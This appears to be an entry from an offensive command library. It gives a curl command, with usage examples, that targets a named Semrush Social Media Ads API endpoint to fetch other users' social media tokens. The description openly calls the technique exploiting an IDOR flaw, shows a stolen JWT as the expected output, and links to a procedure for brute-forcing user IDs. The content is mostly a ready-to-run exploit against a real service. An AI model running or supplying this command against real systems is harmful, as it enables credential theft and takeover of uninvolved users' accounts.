---
data: >-
  curl -H "Authorization: Bearer $TOKEN" -X GET
  "$BASE_URL/social-ads/users/$USER_ID/token"
tags:
  - api
  - fetch
  - token
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:47.693Z'
id: 867eefc9-d983-4ef5-b1d0-44a32b211167
verified: false
validated: true
submitted: true
---
# curl-fetch-user-token

## Command

```bash
curl -H "Authorization: Bearer $TOKEN" -X GET "$BASE_URL/social-ads/users/$USER_ID/token"
```

## Description

This command sends an authenticated GET request to the Semrush Social Media Ads API endpoint to retrieve a user's social media token by ObjectId, exploiting IDOR if the ID is unauthorized.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Authorization: Bearer $TOKEN"` | Authentication header with bearer token | Yes |
| `-X GET` | HTTP method | Yes |
| `$BASE_URL` | API base URL (e.g., https://api.semrush.com) | Yes |
| `$USER_ID` | MongoDB ObjectId of the target user | Yes |

## Examples

### Basic Usage

```bash
TOKEN="your_bearer_token" USER_ID="507f1f77bcf86cd799439011" BASE_URL="https://api.semrush.com"
curl -H "Authorization: Bearer $TOKEN" -X GET "$BASE_URL/social-ads/users/$USER_ID/token"
```

### Advanced Usage

```bash
curl -H "Authorization: Bearer $TOKEN" -X GET "$BASE_URL/social-ads/users/$USER_ID/token" -v
```

(Adds verbose output for debugging.)

## Expected Output

Successful response (JSON): {"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}. Errors: 401 (unauth), 404 (invalid ID), or 403 (authorized but denied).

## Related

- [[Related Procedure: Brute-Force-User-IDs-for-Token-Access]]
